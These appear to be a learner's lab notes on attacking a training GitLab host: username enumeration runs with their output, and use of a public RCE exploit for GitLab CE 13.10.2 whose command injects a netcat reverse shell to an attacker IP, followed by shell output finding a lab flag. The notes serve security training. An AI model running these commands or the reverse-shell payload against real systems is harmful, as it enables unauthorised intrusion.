# Attacking GitLab

## Username Enumeration

https://www.exploit-db.com/exploits/49821
https://github.com/dpgg101/GitLabUserEnum

./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

## Authenticated Remote Code Execution

GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability due to an issue with ExifTool handling metadata in uploaded image files.

https://www.exploit-db.com/exploits/49951

python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

nc -lnvp 8443

## LAB

IP=10.129.97.42
printf "%s\t%s\n\n" "$IP" "gitlab.inlanefreight.local" | sudo tee -a /etc/hosts


git clone https://github.com/dpgg101/GitLabUserEnum
cd GitLabUserEnum/

python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ -w /usr/share/wordlists/rockyou.txt

python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ -w /opt/useful/SecLists/Usernames/Names/names.txt

GitLab User Enumeration in python
[+] The username bob exists!

https://www.exploit-db.com/exploits/49951

nc -lnvp 8443


python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u roott -p Welcome123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.115 8443 >/tmp/f '


git@app04:~/gitlab-workhorse$ ls -l
ls -l
total 16
-rw-r--r-- 1 root root         42 Aug 28  2021 VERSION
-rw-r----- 1 root git         136 Aug 29  2021 config.toml
-rw-r--r-- 1 root root         19 Sep 28  2021 flag_gitlab.txt
drwxr-x--- 2 git  gitlab-www 4096 Jan 12 11:27 sockets
git@app04:~/gitlab-workhorse$ cat flag_gitlab.txt
cat flag_gitlab.txt
s3cure_y0ur_Rep0s!

ls -l /var/opt/gitlab/git-data

python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt
[+] The username bob exists!
[+] The username root exists!
[+] The username demo exists!
[+] The username public exists!
[+] The username help exists!
[+] The username Bob exists!
[+] The username BOB exists!
[+] The username hacker exists!

python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt

python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ -w /opt/useful/SecLists/Usernames/cirt-default-usernames.txt
[+] The username DEMO exists!



